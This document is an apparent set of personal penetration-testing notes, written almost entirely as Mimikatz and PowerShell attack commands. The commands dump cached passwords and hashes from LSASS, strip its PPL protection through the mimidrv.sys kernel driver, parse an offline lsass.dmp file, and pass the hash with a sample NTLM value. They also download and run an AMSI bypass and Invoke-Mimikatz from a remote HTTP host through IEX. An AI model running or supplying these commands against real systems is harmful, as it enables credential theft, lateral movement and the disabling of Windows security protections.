mimikatz # privilege::debug

#Once we have enabled the SeDebugPrivilege privilege, weâ€™ll dump all cached passwords and
#hashes from LSASS with sekurlsa::logonpasswords

mimikatz # sekurlsa::logonpasswords

//Bypass Protected Processes Light (PPL) set in HKLM\SYSTEM\CurrentControlSet\Control\Lsa

mimikatz # privilege::debug

//Mimikatz can load the mimidrv.sys driver with the !+ command
/Once the driver is loaded, we can use it to disable the PPL protection for LSASS through the !processprotect command

mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # sekurlsa::logonpasswords

//dumping password hash offline 

1- dump lsass either by task manager or procdump (from sysinternals) or use custom code (MiniDump.exe) that we would be writting 
2- use mimikatz in the attack machine: here we assume lsass.dmp is the dumped lass process file

mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords 

//passthehash
mimikatz # sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"

//run a command with pth
mimikatz # sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell

PS C:\Windows\system32> Enter-PSSession -Computer appsrv01

//mimikatz from powershell
sc create mimidrv binPath=C:\inetpub\wwwroot\upload\mimidrv.sys type=kernel start=demand

sc start mimidrv

(New-Object System.Net.WebClient).DownloadString('http://192.168.49.164:8000/amsi.txt') | IEX

(New-Object System.Net.WebClient).DownloadString('http://192.168.49.164:8000/Invoke-Mimikatz.ps1') | IEX
    
Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe /remove`""

Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe /remove`"  `"sekurlsa::logonpasswords`" "

Invoke-Mimikatz -Command " `"privilege::debug`" `"!processprotect /process:lsass.exe /remove`" `"sekurlsa::logonpasswords`" "

